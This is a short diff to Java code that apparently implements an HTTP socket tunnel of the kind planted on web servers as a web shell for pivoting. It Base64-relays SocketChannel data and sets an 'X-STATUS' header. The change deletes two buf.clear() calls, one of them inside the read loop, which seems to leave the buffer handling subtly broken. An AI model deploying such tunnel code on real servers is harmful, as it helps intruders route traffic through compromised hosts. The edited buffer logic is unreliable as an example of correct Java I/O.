@@ -218,7 +218,6 @@
                     byte[] data = new byte[bytesRead];
                     System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                     out.write(b64en(data));
-                    buf.clear();
                     bytesRead = socketChannel.read(buf);
                 }
                 response.setHeader("X-STATUS", "OK");
@@ -237,7 +236,6 @@
                 request.getInputStream().read(buff, 0, readlen);
                 byte[] base64 = b64de(new String(buff));
                 ByteBuffer buf = ByteBuffer.allocate(base64.length);
-                buf.clear();
                 buf.put(base64);
                 buf.flip();
 
